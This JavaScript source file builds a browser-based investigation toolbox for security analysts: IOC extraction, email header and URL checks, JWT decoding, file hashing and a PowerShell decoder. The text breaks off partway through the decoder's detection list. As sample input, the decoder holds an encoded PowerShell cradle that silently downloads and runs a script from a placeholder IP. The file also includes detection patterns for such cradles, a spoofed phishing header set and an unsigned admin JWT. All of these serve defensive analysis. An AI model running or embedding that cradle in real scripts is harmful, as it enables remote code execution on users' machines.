// Toolbox: the analyst's investigation tools in one place. Everything runs in the browser; nothing is sent anywhere.
import { $, h, html, put, ext, copyText, fmtDur, icon, fmtNum } from "../core.js";
import { unwrap, extract, classify, pivots, TYPE_NAME, defang, refang, homograph } from "../ti.js";
import { load, cveList } from "../data.js";
import { detail, status, productName } from "../cvecard.js";
import { bump } from "../state.js";
import { hashes, fileType, entropy, strings, MARKERS, RISKY_EXT } from "../filetriage.js";
import { EVENT_IDS, PORT_INFO } from "../content/reference.js";

// [id, name, icon, colour, one-line description, group]
const TOOLS = [
  ["lookup", "Lookup", "target", "#5CE1C6", "One indicator in, every useful pivot out.", "Investigate"],
  ["file", "File and hash check", "file", "#FFB547", "Hash a file, verify a download, and see what it really is.", "Investigate"],
  ["ioc", "IOC extractor", "list", "#5CE1C6", "Pull indicators out of messy text, defanged and ready for a ticket.", "Investigate"],
  ["headers", "Email headers", "mail", "#7FB2FF", "SPF, DKIM, DMARC and the classic sender tricks.", "Investigate"],
  ["url", "URL parser", "link", "#7FB2FF", "Split a URL and see who really owns the host.", "Investigate"],
  ["unwrap", "Unwrap link", "link", "#7FB2FF", "Strip SafeLinks, URL Defense and redirect wrappers.", "Investigate"],
  ["look", "Lookalike domain", "eye", "#FF8A8A", "Punycode, mixed alphabets and brand lookalikes.", "Investigate"],
  ["ua", "User agent", "globe", "#A78BFA", "Browser, OS, bots, scanners and outdated versions.", "Investigate"],
  ["ps", "PowerShell decoder", "terminal", "#FF8A8A", "Decode -EncodedCommand, nested base64 and compressed payloads.", "Decode"],
  ["decode", "Decode", "code", "#A78BFA", "Base64, URL encoding and hex.", "Decode"],
  ["jwt", "JWT", "key", "#A78BFA", "Read a token's header and claims.", "Decode"],
  ["defang", "Defang", "lock", "#A78BFA", "Make indicators safe to paste, or refang them.", "Decode"],
  ["hash", "Hash ID", "hash", "#A78BFA", "Which algorithm made this hash?", "Decode"],
  ["eventid", "Windows event IDs", "list", "#5CE1C6", "What an event ID means and why it matters.", "Reference"],
  ["port", "Port lookup", "plug", "#5CE1C6", "What runs on a port and how attackers use it.", "Reference"],
  ["time", "Time", "timer", "#5CE1C6", "Epoch, milliseconds, FILETIME and ISO dates.", "Reference"],
  ["cidr", "CIDR", "grid", "#5CE1C6", "Subnet maths and 'is this IP in that range?'.", "Reference"],
];
const T = Object.fromEntries(TOOLS.map((t) => [t[0], t]));

export async function mount(sec) {
  html(sec, `<div class="vh"><h1>Toolbox</h1><p>Investigation tools that run in your browser. Nothing you paste or drop leaves this page.</p></div>
  <div class="tbx"><nav class="tbx-nav" id="tbTabs" aria-label="Tools"></nav><div class="panel tbx-pane"><header class="tbx-head" id="tbHead"></header><div id="toolbox"></div></div></div>`);
  const groups = [...new Set(TOOLS.map((t) => t[5]))];
  put($("#tbTabs"), groups.map((g) => [h("p.tbx-g", g), TOOLS.filter((t) => t[5] === g).map(([k, l, ic, col]) => {
    const b = h("button", { type: "button", dataset: { t: k } }, icon(ic), h("span", l)); b.style.setProperty("--tc", col); return b;
  })]));
  $("#tbTabs").addEventListener("click", (e) => { const b = e.target.closest("button"); if (b) openTool(b.dataset.t); });
  const want = new URLSearchParams(location.hash.split("?")[1] || "").get("t");
  openTool(T[want] ? want : "lookup");
}
function openTool(t) {
  const [, name, ic, col, desc] = T[t];
  const head = $("#tbHead"); head.style.setProperty("--tc", col);
  put(head, h("span.tbx-icon", icon(ic)), h("div", h("h2.tbx-h", name), h("p.tbx-d", desc)), h("span.tbx-local", icon("lock"), "Runs locally"));
  [...$("#tbTabs").querySelectorAll("button")].forEach((x) => { const on = x.dataset.t === t; x.classList.toggle("on", on); x.setAttribute("aria-current", on ? "true" : "false"); });
  tool(t); bump("tool");
}

// ---------- shared rendering ----------
// Turns the plain-text result of a tool into readable blocks: key/value rows, flags, headings and lists.
function fancy(box, text) {
  box._raw = text; const out = [];
  let list = null;
  const flush = () => { if (list) { out.push(list); list = null; } };
  for (const line of String(text).split("\n")) {
    if (!line.trim()) { flush(); continue; }
    let m;
    if ((m = line.match(/^• (.*)$/))) { if (!list || !list.classList.contains("fx-flags")) { flush(); list = h("ul.fx-flags"); } list.append(h("li", m[1])); continue; }
    if ((m = line.match(/^ {2}(.*)$/)) && list?.classList.contains("fx-items")) { list.append(h("li", m[1])); continue; }
    flush();
    if ((m = line.match(/^(.{1,40}) \((\d+)\)$/))) { out.push(h("h4.fx-h", m[1], h("span.fx-n", m[2]))); list = h("ul.fx-items"); continue; }
    if ((m = line.match(/^([A-Za-z][^:]{0,28}):$/))) { out.push(h("h4.fx-h", m[1])); list = h("ul.fx-items"); continue; }
    if ((m = line.match(/^([A-Za-z][A-Za-z0-9 /().+-]{0,28}?):\s+(.+)$/))) {
      const v = m[2]; const tone = /\b(fail|softfail|INSIDE|expired|MISMATCH|none)\b/.test(v) ? ".bad" : /\b(pass|MATCH)\b/.test(v) ? ".good" : "";
      out.push(h("div.fx-kv", h("span.fx-k", m[1]), h("span.fx-v" + tone, v))); continue;
    }
    if ((m = line.match(/^(\d+)\. (.*)$/))) { out.push(h("div.fx-step", h("span.fx-i", m[1]), h("span", m[2]))); continue; }
    if ((m = line.match(/^\s+→ (.*)$/))) { out.push(h("div.fx-arrow", m[1])); continue; }
    out.push(h("p.fx-line", line));
  }
  flush();
  put(box, out);
}
const outBox = () => h("div.tres", { "aria-live": "polite" });

function headers(raw) {
  const text = raw.replace(/\r/g, "").replace(/\n[ \t]+/g, " "); const get = (k) => (text.match(new RegExp(`^${k}:\\s*(.*)$`, "gim")) || []).map((l) => l.replace(new RegExp(`^${k}:\\s*`, "i"), ""));
  const dom = (s) => (String(s || "").match(/@([a-z0-9.-]+)/i) || [])[1]?.toLowerCase() || "";
  const from = get("From")[0] || "", rp = get("Return-Path")[0] || "", reply = get("Reply-To")[0] || "", mid = get("Message-ID")[0] || "";
  const auth = get("Authentication-Results").join(" ").toLowerCase(); const res = (k) => (auth.match(new RegExp(`${k}=(\\w+)`)) || [])[1] || "not found";
  const recv = get("Received"); const ips = [...new Set(recv.join(" ").match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [])];
  const flags = [];
  if (["fail", "softfail"].includes(res("spf"))) flags.push(`SPF ${res("spf")}: the sending server isn't allowed to send for that domain.`);
  if (res("dkim") === "none" || res("dkim") === "fail") flags.push(`DKIM ${res("dkim")}: the message isn't signed by the domain, or the signature broke.`);
  if (res("dmarc") === "fail") flags.push("DMARC fail: the visible From domain didn't pass. Strong sign of spoofing.");
  if (dom(from) && dom(rp) && dom(from) !== dom(rp)) flags.push(`From (${dom(from)}) and Return-Path (${dom(rp)}) differ. Common for newsletters, suspicious for banks and colleagues.`);
  if (dom(reply) && dom(reply) !== dom(from)) flags.push(`Reply-To goes to ${dom(reply)}, not ${dom(from)}. Replies would go to someone else: classic BEC.`);
  if (dom(mid) && dom(from) && !dom(mid).endsWith(dom(from).split(".").slice(-2).join("."))) flags.push(`Message-ID domain (${dom(mid)}) doesn't match the sender.`);
  const disp = (from.match(/^"?([^"<]+)"?\s*</) || [])[1]; if (disp && /@/.test(disp)) flags.push("The display name contains an email address. Phishers use it to show a fake sender.");
  return `From: ${from}\nReturn-Path: ${rp || "not found"}\nReply-To: ${reply || "not set"}\nSubject: ${get("Subject")[0] || ""}\nSPF: ${res("spf")}\nDKIM: ${res("dkim")}\nDMARC: ${res("dmarc")}\nHops: ${recv.length}\nIPs in chain: ${ips.join(", ") || "none"}\n\n${flags.length ? "Red flags:\n" + flags.map((x) => "• " + x).join("\n") : "No classic red flags. Still check links and attachments."}`;
}

function tool(t) {
  const box = $("#toolbox"); const inp = h("textarea.short", { spellcheck: "false", "aria-label": "Input" }); const out = outBox();
  const run = (fn) => { const go = () => { try { fancy(out, fn(inp.value)); } catch (e) { fancy(out, "• Couldn't read that: " + String(e.message || e).slice(0, 120)); } }; inp.addEventListener("input", go); go(); };
  const copyBtn = (label = "Copy result") => h("div.row", h("button.btn.sm", { type: "button", onclick: () => copyText(out._raw || "", "Copied") }, label));
  if (t === "lookup") {
    const o = h("div.pivot-out"); inp.placeholder = "IP, domain, URL, hash, email, CVE or ATT&CK ID. Defanged is fine."; inp.value = "";
    const go = async () => {
      const ind = classify(inp.value); if (ind.type === "empty") { put(o); return; }
      if (ind.type === "unknown") { put(o, h("p.muted", "Not a type we recognise. Try the IOC extractor for messy text.")); return; }
      const notes = [];
      if (ind.private) notes.push(h("p.note", "Private or reserved address. Public intel won't know it: check your CMDB, DHCP and EDR."));
      if (ind.type === "cve") { const c = cveList(await load("cves")).find((x) => x.id === ind.value); notes.push(c ? h("p.note.ok", "In today's feed: ", h("button.linkbtn", { type: "button", onclick: () => detail(c) }, `${productName(c)} · ${status(c)[0]}`)) : h("p.note", "Not in our current feed of recent exploited and critical CVEs.")); }
      if (["sha256", "sha1", "md5"].includes(ind.type)) notes.push(h("p.note", "Look up hashes. Don't upload company files to public sandboxes."));
      if (ind.type === "url" || ind.type === "domain") notes.push(h("p.note", "Don't open it in your normal browser. Share it as ", h("code", defang(ind.value))));
      put(o, h("p.lk-type", h("span.lk-badge", TYPE_NAME[ind.type]), h("code", ind.value), h("button.btn.ghost.sm", { type: "button", onclick: () => copyText(ind.value, "Copied") }, "Copy")),
        notes, h("ul.pivots", pivots(ind).map(([l, u, why]) => h("li", ext(u, l), h("span.muted", why)))));
    };
    inp.rows = 2; inp.addEventListener("input", go); go();
    put(box, h("p.muted.small", "Nothing is sent until you click a link. Each opens in a new tab with no referrer."), inp, o);
  } else if (t === "file") {
    fileTool(box);
  } else if (t === "unwrap") {
    inp.placeholder = "Paste a SafeLinks, Proofpoint URL Defense, Google or other redirect link";
    inp.value = "https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Furldefense.com%2Fv3%2F__https%3A%2F%2Fexample.com%2Finvoice%3Fid%3D42__%3B!!AbC%24&data=05%7C02&reserved=0";
    run((v) => { const r = unwrap(v); if (!r.steps.length) return `No wrapper found.\n\nFinal URL: ${r.final}\nSafe to share: ${defang(r.final)}`;
      return r.steps.map((s, i) => `${i + 1}. ${s.how}\n   → ${s.to}`).join("\n") + `\n\nFinal URL: ${r.final}\nSafe to share: ${defang(r.final)}`; });
    put(box, h("p.muted.small", "Strips Microsoft SafeLinks, Proofpoint URL Defense (v1, v2, v3), Barracuda, Google and common ?url= redirects, layer by layer. Nothing is opened or fetched."), inp, out);
  } else if (t === "ioc") {
    inp.placeholder = "Paste an alert, email body, report or log lines"; inp.classList.add("tall");
    inp.value = "User clicked hxxps://login-micros0ft[.]com/auth from 10.20.1.15. Payload a3f5c2e1d4b6978f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c1b2a3f dropped. C2 185.220.101[.]4. Reported by kevin@corp.example. Related: CVE-2026-10005.";
    run((v) => iocText(extract(v)) || "No indicators found.");
    put(box, h("p.muted.small", "Pulls URLs, domains, IPs, emails, hashes and CVEs out of messy text. Handles defanged input. URLs and domains come back defanged so you can paste them into a ticket safely."), inp, out, copyBtn("Copy all"));
  } else if (t === "headers") {
    inp.placeholder = "Paste the full email headers (in Outlook: File, Properties, Internet headers)"; inp.classList.add("tall");
    inp.value = "Return-Path: <bounce@mailer-x.top>\nReceived: from mailer-x.top (unknown [203.0.113.50]) by mx.corp.example\nAuthentication-Results: mx.corp.example; spf=fail smtp.mailfrom=mailer-x.top; dkim=none; dmarc=fail header.from=paypal.com\nFrom: \"PayPal Service\" <service@paypal.com>\nReply-To: helpdesk@paypa1-support.top\nSubject: Your account is limited\nMessage-ID: <abc123@mailer-x.top>";
    run(headers);
    put(box, h("p.muted.small", "Reads the authentication results, the sender chain and the classic mismatches. Parsed in your browser."), inp, out);
  } else if (t === "url") {
    inp.placeholder = "Paste a URL (defanged is fine)"; inp.value = "hxxps://login.microsoftonline.com.secure-verify[.]top:8443/common/oauth2/authorize?client_id=abc&redirect_uri=https%3A%2F%2Fevil.example%2Fcb#frag";
    run((v) => { const u = new URL(refang(v).trim()); const parts = u.hostname.split("."); const reg = parts.slice(-2).join(".");
      const q = [...u.searchParams].map(([k, val]) => `  ${k} = ${val}`).join("\n");
      const flags = [];
      if (u.hostname.split(".").length > 4) flags.push("Many subdomains: a long host can push the real domain out of view.");
      if (/(login|signin|secure|verify|account|microsoft|office|paypal|apple|bank)/i.test(parts.slice(0, -2).join(".")) && !/(microsoft|office|paypal|apple)\.com$/.test(reg)) flags.push(`Brand or security words sit in front of ${reg}, which is the real owner.`);
      if (u.port && !["80", "443"].includes(u.port)) flags.push(`Unusual port ${u.port}.`);
      if (u.username) flags.push("Text before @ is ignored by browsers: a classic trick.");
      if (/^\d+\.\d+\.\d+\.\d+$/.test(u.hostname)) flags.push("Raw IP address instead of a domain.");
      return `Scheme: ${u.protocol.replace(":", "")}\nHost: ${u.hostname}\nReal owner: ${reg}\nPort: ${u.port || "default"}\nPath: ${decodeURIComponent(u.pathname)}\n${u.hash ? "Fragment: " + u.hash + "\n" : ""}${q ? "\nParameters:\n" + q + "\n" : ""}${flags.length ? "\n" + flags.map((x) => "• " + x).join("\n") + "\n" : ""}\nSafe to share: ${defang(u.href)}`; });
    put(box, h("p.muted.small", "Splits a URL into parts and shows who really owns the host. Read hosts right to left."), inp, out);
  } else if (t === "look") {
    inp.placeholder = "A domain, e.g. xn--pple-43d.com or rnicrosoft-login.co"; inp.value = "xn--pple-43d.com";
    run((v) => { const host = (() => { const x = refang(v).trim(); try { return new URL(x.includes("://") ? x : "http://" + x).hostname; } catch { return x; } })(); const r = homograph(host);
      return `Domain: ${host}\n\n${r.notes.length ? r.notes.map((x) => "• " + x).join("\n") : "Nothing obviously deceptive. Still check the registration date with the Lookup pivots."}`; });
    put(box, h("p.muted.small", "Checks for punycode, mixed alphabets, brand lookalikes and security-sounding bolt-ons."), inp, out);
  } else if (t === "ua") {
    inp.placeholder = "Paste a User-Agent string from a log"; inp.rows = 3;
    inp.value = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/96.0.4664.45 Safari/537.36";
    run(userAgent);
    put(box, h("p.muted.small", "Works out the browser, system and tool behind a User-Agent, and flags scanners, scripts, headless browsers and versions over a year old. User-Agents are easy to fake, so treat this as a clue, not proof."), inp, out);
  } else if (t === "ps") {
    inp.placeholder = "Paste a command line, e.g. powershell -nop -w hidden -enc SQBFAFgA..."; inp.classList.add("tall");
    const enc = (s) => btoa(String.fromCharCode(...new Uint8Array(new Uint16Array([...s].map((c) => c.charCodeAt(0))).buffer)));
    inp.value = "powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand " + enc("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')");
    const go = async () => { try { fancy(out, await psDecode(inp.value)); } catch (e) { fancy(out, "• Couldn't decode that: " + String(e.message || e).slice(0, 120)); } };
    inp.addEventListener("input", go); go();
    put(box, h("p.muted.small", "Finds -EncodedCommand (and its short forms), decodes UTF-16LE, then follows FromBase64String and Gzip or Deflate layers. Nothing is run."), inp, out, copyBtn());
  } else if (t === "jwt") {
    inp.placeholder = "Paste a JWT (header.payload.signature)";
    // Built at runtime so no token-shaped string lives in the source (secret scanners rightly flag those).
    const b64u = (o) => btoa(JSON.stringify(o)).replace(/=+$/, "").replace(/\+/g, "-").replace(/\//g, "_");
    inp.value = `${b64u({ alg: "none", typ: "JWT" })}.${b64u({ sub: "kevin", role: "admin", exp: 1700000000 })}.`;
    run((v) => { const [a, b] = v.trim().split("."); const dec = (x) => JSON.parse(new TextDecoder().decode(Uint8Array.from(atob(x.replace(/-/g, "+").replace(/_/g, "/").padEnd(Math.ceil(x.length / 4) * 4, "=")), (c) => c.charCodeAt(0))));
      const hd = dec(a), pl = dec(b); const notes = [];
      if (String(hd.alg).toLowerCase() === "none") notes.push("alg is 'none': unsigned. Any server accepting this is broken.");
      const lines = (o) => Object.entries(o).map(([k, v]) => `  ${k} = ${typeof v === "object" ? JSON.stringify(v) : v}${["exp", "iat", "nbf"].includes(k) && typeof v === "number" ? `  (${new Date(v * 1000).toISOString()}${k === "exp" && v * 1000 < Date.now() ? ", expired" : ""})` : ""}`).join("\n");
      return `Header:\n${lines(hd)}\n\nPayload:\n${lines(pl)}${notes.length ? "\n\n" + notes.map((x) => "• " + x).join("\n") : ""}\n\nThe signature is not checked: decoding is not verifying.`; });
    put(box, h("p.warn", "Tokens are live credentials. Only paste expired or test tokens."), inp, out);
  } else if (t === "cidr") {
    inp.placeholder = "CIDR, optionally followed by an IP to test, e.g. 10.20.0.0/22 10.20.3.7"; inp.value = "10.20.0.0/22 10.20.3.7";
    run((v) => { const [cidr, test] = v.trim().split(/\s+/); const [ip, bits = "32"] = cidr.split("/"); const n = +bits;
      const toI = (x) => { const p = x.split(".").map(Number); if (p.length !== 4 || p.some((o) => !(o >= 0 && o <= 255))) throw new Error("not an IPv4 address"); return ((p[0] << 24) >>> 0) + (p[1] << 16) + (p[2] << 8) + p[3]; };
      const toS = (i) => [24, 16, 8, 0].map((s) => (i >>> s) & 255).join("."); if (!(n >= 0 && n <= 32)) throw new Error("prefix must be 0 to 32");
      const mask = n === 0 ? 0 : (0xffffffff << (32 - n)) >>> 0; const net = (toI(ip) & mask) >>> 0; const bc = (net | (~mask >>> 0)) >>> 0; const size = 2 ** (32 - n);
      let o = `Network: ${toS(net)}/${n}\nNetmask: ${toS(mask)}\nFirst host: ${toS(n >= 31 ? net : net + 1)}\nLast host: ${toS(n >= 31 ? bc : bc - 1)}\nBroadcast: ${toS(bc)}\nAddresses: ${size.toLocaleString()}`;
      if (test) o += `\nTest IP: ${test} is ${((toI(test) & mask) >>> 0) === net ? "INSIDE" : "outside"} this range`; return o; });
    put(box, h("p.muted.small", "IPv4 subnet maths, and a quick 'is this IP in that range?' check."), inp, out);
  } else if (t === "time") {
    inp.placeholder = "1795449564 or 1795449564569 or 2026-11-23T08:00:00Z"; inp.value = String(Math.floor(Date.now() / 1000));
    run((v) => { v = v.trim(); if (!v) return ""; const d = /^\d{10}$/.test(v) ? new Date(+v * 1000) : /^\d{13}$/.test(v) ? new Date(+v) : /^\d{18}$/.test(v) ? new Date((+v / 1e4) - 11644473600000) : new Date(v);
      if (isNaN(d)) throw new Error("not a date or epoch"); return `UTC: ${d.toISOString()}\nLocal: ${d.toString()}\nEpoch s: ${Math.floor(d / 1000)}\nEpoch ms: ${+d}\nAge: ${fmtDur(Math.abs(Date.now() - d))} ${d > Date.now() ? "from now" : "ago"}`; });
    put(box, h("p.muted.small", "Paste epoch seconds, milliseconds, Windows FILETIME (18 digits) or an ISO date."), inp, out);
  } else if (t === "defang") {
    inp.placeholder = "Paste URLs, domains or IPs, one per line"; inp.value = "https://evil.example/login\n198.51.100.7";
    const o2 = h("pre.codebox.out");
    const go = () => { o2.textContent = inp.value.split("\n").map((l) => /\[\.\]|hxxp/i.test(l) ? l.replace(/\[\.\]/g, ".").replace(/hxxp/gi, "http").replace(/\[:\]/g, ":") : l.replace(/\./g, "[.]").replace(/^http/i, "hxxp")).join("\n"); };
    inp.addEventListener("input", go); go();
    put(box, h("p.muted.small", "Defanged IOCs can't be clicked by accident. Already defanged? It refangs them."), inp, o2, h("div.row", h("button.btn.sm", { type: "button", onclick: () => copyText(o2.textContent, "Copied") }, "Copy")));
  } else if (t === "decode") {
    inp.placeholder = "Base64, URL-encoded or hex"; inp.value = "SGVsbG8gZnJvbSB0aGUgU09D";
    run((v) => { v = v.trim(); const res = []; const printable = (s) => s.replace(/[^\x20-\x7e\n\t]/g, "·");
      if (/^[A-Za-z0-9+/=\s_-]+$/.test(v) && v.replace(/\s/g, "").length % 4 !== 1) { try { const bin = atob(v.replace(/\s/g, "").replace(/-/g, "+").replace(/_/g, "/")); res.push("Base64: " + printable(bin)); let u = ""; for (let i = 0; i + 1 < bin.length; i += 2) u += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i + 1) << 8)); if (/^[\x20-\x7e\s]+$/.test(u)) res.push("Base64 UTF-16LE: " + u); } catch { /* not base64 */ } }
      if (/%[0-9a-f]{2}/i.test(v)) { try { res.push("URL decoded: " + decodeURIComponent(v)); } catch { /* bad */ } }
      if (/^(0x)?([0-9a-f]{2}\s?)+$/i.test(v)) res.push("Hex: " + printable(v.replace(/^0x|\s/gi, "").match(/../g).map((x) => String.fromCharCode(parseInt(x, 16))).join("")));
      return res.join("\n") || "Doesn't look like base64, URL encoding or hex."; });
    put(box, h("p.muted.small", "Decodes in your browser. Nothing is executed. Never paste real case data into online decoders. For PowerShell, use the PowerShell decoder."), inp, out);
  } else if (t === "eventid") {
    eventTool(box);
  } else if (t === "port") {
    portTool(box);
  } else {
    inp.placeholder = "Paste a hash"; inp.value = "44d88612fea8a8f36de82e1278abb02f";
    run((v) => { v = v.trim(); const L = { 32: "MD5 (or NTLM)", 40: "SHA-1", 56: "SHA-224", 64: "SHA-256", 96: "SHA-384", 128: "SHA-512" };
      if (/^\$2[aby]\$/.test(v)) return "Algorithm: bcrypt"; if (/^\$argon2/.test(v)) return "Algorithm: Argon2"; if (/^\$6\$/.test(v)) return "Algorithm: SHA-512 crypt (Linux /etc/shadow)"; if (/^\$1\$/.test(v)) return "Algorithm: MD5 crypt (old Linux)";
      if (!/^[0-9a-f]+$/i.test(v)) return "• Not a hex hash."; return `Length: ${v.length} hex characters\nAlgorithm: ${L[v.length] || "unknown length"}`; });
    put(box, h("p.muted.small", "Identify a hash by its length and format. To make a hash of a file, use File and hash check."), inp, out);
  }
}

function iocText(x) {
  // .NET and PowerShell class names (Net.WebClient, System.IO) look like domains to a regex; drop them.
  x = { ...x, domains: x.domains.filter((d) => !/^(net|system|io|microsoft|management|reflection|text|security)\.[a-z]+$/i.test(d)) };
  const sec = (n, a, d = false) => a.length ? `${n} (${a.length})\n${a.map((y) => "  " + (d ? defang(y) : y)).join("\n")}` : "";
  return [sec("URLs", x.urls, true), sec("Domains", x.domains, true), sec("IPv4", x.ips), sec("Emails", x.emails), sec("SHA-256", x.sha256), sec("SHA-1", x.sha1), sec("MD5", x.md5), sec("CVEs", x.cves)].filter(Boolean).join("\n\n");
}

// ---------- File and hash check ----------
const MAX_FILE = 200 * 1024 * 1024;
function fileTool(box) {
  const pick = h("input", { type: "file", id: "ftIn", class: "sr-only" });
  const zone = h("label.ft-drop", { for: "ftIn", tabindex: "0" }, icon("upload"), h("b", "Drop a file here, or choose one"), h("span.muted.small", "Read in this tab only. Not uploaded anywhere. Up to 200 MB."));
  const expect = h("input.ft-expect", { type: "text", placeholder: "Optional: paste the hash the vendor published, to verify the download", spellcheck: "false", "aria-label": "Expected hash", autocomplete: "off" });
  const res = h("div.ft-res", { "aria-live": "polite" });
  const txt = h("textarea.short", { spellcheck: "false", "aria-label": "Text to hash", placeholder: "Or type text here to hash it (UTF-8)" });
  const txtOut = outBox();
  let last = null;
  const show = async (file) => {
    if (!file) return;
    if (file.size > MAX_FILE) { put(res, h("p.warn", "That file is over 200 MB. Hash it on your machine instead: certutil -hashfile <file> SHA256 on Windows, sha256sum <file> on Linux or macOS.")); return; }
    put(res, h("p.muted", `Reading ${file.name}…`));
    const buf = new Uint8Array(await file.arrayBuffer());
    last = { file, buf, hs: await hashes(buf) };
    render();
  };
  const verdict = () => {
    const want = expect.value.trim().toLowerCase().replace(/^[a-z0-9-]+[:=]\s*/i, "").replace(/\s/g, "");
    if (!want || !last) return null;
    const hit = Object.entries(last.hs).find(([, v]) => v === want);
    return hit ? h("div.ft-verdict.good", icon("check"), h("b", `Match: ${hit[0].toUpperCase()} is identical.`), h("span", "The file is exactly what the publisher released."))
      : h("div.ft-verdict.bad", icon("x"), h("b", "No match."), h("span", "This file is not the one the hash describes. Do not run it. Check you copied the right hash and algorithm."));
  };
  const render = () => {
    if (!last) return;
    const { file, buf, hs } = last;
    const ft = fileType(buf); const fext = (file.name.match(/\.([a-z0-9]{1,8})$/i) || [])[1]?.toLowerCase() || "";
    const ent = entropy(buf.length > 8e6 ? buf.subarray(0, 8e6) : buf);
    const strs = strings(buf.length > 8e6 ? buf.subarray(0, 8e6) : buf);
    const blob = strs.join("\n").slice(0, 2e6);
    const flags = [];
    if (fext && ft.exts.length && !ft.exts.includes(fext) && ft.kind !== "text") flags.push(`Named .${fext} but the content is a ${ft.name}. Disguised files are a classic trick.`);
    if (/\.(pdf|docx?|xlsx?|jpg|png|txt)\.(exe|scr|js|vbs|lnk|hta|bat|cmd)$/i.test(file.name)) flags.push("Double extension: the real type is the last one.");
    if (RISKY_EXT.has(fext)) flags.push(`.${fext} files can run code when opened.`);
    if (["container"].includes(ft.kind)) flags.push("Disk images are used to slip files past Mark-of-the-Web protections.");
    for (const [rx, why] of MARKERS) if (rx.test(blob)) flags.push(why);
    if (ent > 7.2 && ft.kind !== "archive" && ft.kind !== "media" && !/document/.test(ft.name)) flags.push("Very high entropy: likely packed, compressed or encrypted content.");
    const iocs = extract(blob);
    const hashRow = (k, v) => h("div.ft-hash", h("span.ft-alg", k), h("code", v), h("button.btn.ghost.sm", { type: "button", onclick: () => copyText(v, `${k} copied`) }, "Copy"));
    const meter = h("div.ft-meter", { title: `${ent.toFixed(2)} bits per byte` }, h("i")); meter.firstChild.style.width = `${(ent / 8) * 100}%`;
    const piv = pivots(classify(hs.sha256)).slice(0, 6);
    put(res,
      h("div.ft-card",
        h("div.ft-top", h("span.ft-kind.k-" + ft.kind, ft.name), h("b.ft-name", file.name), h("span.muted.small", `${fmtNum(file.size)} bytes${file.size >= 1e4 ? ` (${file.size.toLocaleString()})` : ""}`)),
        verdict(),
        h("div.ft-hashes", hashRow("MD5", hs.md5), hashRow("SHA-1", hs.sha1), hashRow("SHA-256", hs.sha256), hashRow("SHA-512", hs.sha512)),
        h("div.ft-ent", h("span.fx-k", "Entropy"), meter, h("span.ft-entv", `${ent.toFixed(2)} / 8 · ${ent > 7.2 ? "packed or encrypted" : ent > 6 ? "compressed or mixed" : "plain"}`)),
        flags.length ? h("ul.fx-flags", flags.map((f) => h("li", f))) : h("p.note.ok", "No obvious red flags. That is not the same as safe: check the hash reputation below."),
        h("h4.fx-h", "Check the hash"), h("ul.pivots", piv.map(([l, u, why]) => h("li", ext(u, l), h("span.muted", why)))),
        iocText(iocs) ? [h("h4.fx-h", "Indicators inside the file"), (() => { const b = outBox(); fancy(b, iocText(iocs)); return b; })()] : null,
        strs.length ? h("details.ft-strs", h("summary", `Printable strings (${fmtNum(strs.length)}${strs.length >= 4000 ? "+" : ""})`), h("pre.codebox", strs.slice(0, 400).join("\n"))) : null));
  };
  pick.addEventListener("change", () => show(pick.files[0]));
  zone.addEventListener("keydown", (e) => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); pick.click(); } });
  zone.addEventListener("dragover", (e) => { e.preventDefault(); zone.classList.add("over"); });
  zone.addEventListener("dragleave", () => zone.classList.remove("over"));
  zone.addEventListener("drop", (e) => { e.preventDefault(); zone.classList.remove("over"); show(e.dataTransfer.files[0]); });
  expect.addEventListener("input", render);
  txt.addEventListener("input", async () => { if (!txt.value) { put(txtOut); return; } const s = await hashes(new TextEncoder().encode(txt.value)); fancy(txtOut, `MD5: ${s.md5}\nSHA-1: ${s.sha1}\nSHA-256: ${s.sha256}`); });
  put(box, zone, pick, expect, res, h("details.ft-text", h("summary", "Hash some text instead"), txt, txtOut),
    h("p.muted.small", "Hashes are made with your browser's Web Crypto (SHA family) and a local MD5. Look hashes up; never upload company files to public sandboxes."));
}

// ---------- PowerShell decoder ----------
const u16 = (bytes) => { let s = ""; for (let i = 0; i + 1 < bytes.length; i += 2) s += String.fromCharCode(bytes[i] | (bytes[i + 1] << 8)); return s; };
const b64bytes = (s) => Uint8Array.from(atob(s.replace(/\s/g, "")), (c) => c.charCodeAt(0));
const looksUtf16 = (b) => b.length > 3 && b[1] === 0 && b[3] === 0;
async function inflate(bytes, kind) {
  const ds = new DecompressionStream(kind); const w = ds.writable.getWriter(); w.write(bytes); w.close();
  return new Uint8Array(await new Response(ds.readable).arrayBuffer());
}
async function psDecode(raw) {
  const text = raw.trim(); if (!text) return "";
  const layers = []; let cur = text;
  const m = text.match(/\s-(?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\s+["']?([A-Za-z0-9+/=]{8,})/i);
  if (m) { cur = u16(b64bytes(m[1])); layers.push("Decoded -EncodedCommand (Base64, UTF-16LE)"); }
  else if (/^[A-Za-z0-9+/=\s]{16,}$/.test(text)) { const b = b64bytes(text); cur = looksUtf16(b) ? u16(b) : new TextDecoder().decode(b); layers.push("Decoded a bare Base64 string"); }
  for (let i = 0; i < 5; i++) {
    const f = cur.match(/FromBase64String\(\s*["']([A-Za-z0-9+/=\s]{16,})["']\s*\)/i); if (!f) break;
    let b = b64bytes(f[1]); let how = "Followed FromBase64String";
    if (/GzipStream/i.test(cur) || (b[0] === 0x1f && b[1] === 0x8b)) { b = await inflate(b, "gzip"); how += " + Gzip"; }
    else if (/DeflateStream/i.test(cur)) { b = await inflate(b, "deflate-raw"); how += " + Deflate"; }
    cur = looksUtf16(b) ? u16(b) : new TextDecoder().decode(b); layers.push(how);
  }
  const flags = [];
  const R = [[/\bIEX\b|Invoke-Expression/i, "Runs a string as code (Invoke-Expression)"], [/DownloadString|DownloadFile|Net\.WebClient|Invoke-WebRequest|\biwr\b|Start-BitsTransfer|curl\s|wget\s/i, "Downloads from the internet"],
    [/-w(in(dowstyle)?)?\s+h(idden)?\b/i, "Hidden window"], [/-(ep|exec(utionpolicy)?)\s+bypass/i, "Execution policy bypassed"], [/-nop\b|-noprofile/i, "Skips the user profile"],
